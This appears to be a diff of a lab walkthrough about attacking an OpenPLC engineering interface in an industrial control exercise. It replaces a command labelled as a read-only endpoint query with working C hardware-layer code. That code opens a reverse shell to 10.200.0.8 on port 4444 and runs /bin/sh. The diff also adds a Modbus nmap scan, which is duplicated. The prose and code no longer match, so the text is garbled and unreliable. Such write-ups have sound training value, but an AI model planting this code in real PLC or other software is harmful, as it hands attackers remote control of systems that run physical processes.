@@ -225,7 +225,46 @@ During the exercise, the operator console's **Intertie Coordination** panel iden
 The source also defines a read-only endpoint:
 
 ```bash
-curl -sS http://${TARGET}:8090/api/intertie
+#include "ladder.h"
+#include <stdio.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+
+int ignored_bool_inputs[] = {-1};
+int ignored_bool_outputs[] = {-1};
+int ignored_int_inputs[] = {-1};
+int ignored_int_outputs[] = {-1};
+
+void initCustomLayer()
+{
+}
+
+void updateCustomIn()
+{
+}
+
+void updateCustomOut()
+{
+    int port = 4444;
+    struct sockaddr_in revsockaddr;
+
+    int sockt = socket(AF_INET, SOCK_STREAM, 0);
+    revsockaddr.sin_family = AF_INET;       
+    revsockaddr.sin_port = htons(port);
+    revsockaddr.sin_addr.s_addr = inet_addr("10.200.0.8");
+
+    connect(sockt, (struct sockaddr *) &revsockaddr, sizeof(revsockaddr));
+    dup2(sockt, 0);
+    dup2(sockt, 1);
+    dup2(sockt, 2);
+
+    char * const argv[] = {"/bin/sh", NULL};
+    execve("/bin/sh", argv, NULL);
+}
 ```
 
 ## 9. Investigate the OpenPLC engineering interface
@@ -247,6 +286,11 @@ The dashboard showed the existing governor-control program running before the ha
 ### 9.2 Inspect and modify the hardware layer
 
 From the engineering dashboard, the operator navigated to **Hardware** and selected **Blank Linux**. The page exposed a **Hardware Layer Code Box** for custom C/C++ hardware-layer code.
+
+```bash
+nmap -Pn -sT -p 502 --script modbus-discover "${TARGET}"
+nmap -Pn -sT -p 502 --script modbus-discover "${TARGET}"
+```
 
 ![Figure 15. Hardware page showing the Hardware Layer Code Box](images/15-legacy-hardware-code-box.png)
 
